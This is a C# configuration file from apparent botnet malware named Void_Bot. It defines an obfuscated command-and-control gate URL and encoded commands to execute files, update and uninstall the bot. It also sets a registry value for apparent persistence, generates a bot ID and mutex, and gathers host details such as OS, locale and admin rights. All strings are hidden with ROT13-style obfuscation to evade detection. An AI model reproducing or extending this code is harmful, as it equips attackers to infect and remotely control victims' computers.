using System;
using System.Diagnostics;
using System.IO;
using Void_Bot.Core;

namespace Void_Bot;

internal class Config
{
	public static string Config_BotVersion = Cryptography.ROT13("i1.0.1");

	public static int Config_MainThreadInterval = 3;

	public static string Config_GateURL = Cryptography.ReadConfigString("qJqaLmbiY3IvMzphn25hYzA5Y2yvqaSso2WaLKWaY3EhM3VhL3Iw");

	public static string Config_Command_ExecuteFile = Cryptography.ReadConfigString("pzglpTuapy9mqayl");

	public static string Config_Command_UpdateBot = Cryptography.ReadConfigString("nTAkozqlK29vMj==");

	public static string Config_Command_UninstallBot = Cryptography.ReadConfigString("nTS2LJMaoay5K29vMj==");

	public static string Config_Command_EndOfTasklist = Cryptography.ReadConfigString("LJWupt==");

	public static string BotData_Environment = Environment.GetEnvironmentVariable(Cryptography.ROT13("NCCQNGN"));

	public static string BotData_ID = Functions.GenerateBotID();

	public static string BotData_Path = Process.GetCurrentProcess().MainModule!.FileName;

	public static string BotData_MD5 = Cryptography.GetFileMD5(BotData_Path);

	public static string BotData_RegistryValueName = Cryptography.ROT13("ERT_") + Functions.GenerateMutex();

	public static string Environment_OS = Functions.GetOSName();

	public static string Environment_Platform = Functions.GetPlatform();

	public static string Environment_Locale = Functions.GetLocale();

	public static bool Environment_IsAdmin = Functions.IsAdmin();

	public static string Environment_UserDirectory = Path.Combine(Environment.UserDomainName, Environment.UserName);

	public static string Environment_RegistryLocation = Cryptography.ROT13("UXPH");

	public static string Const_FunctionError = Cryptography.ROT13("REEBE");
}
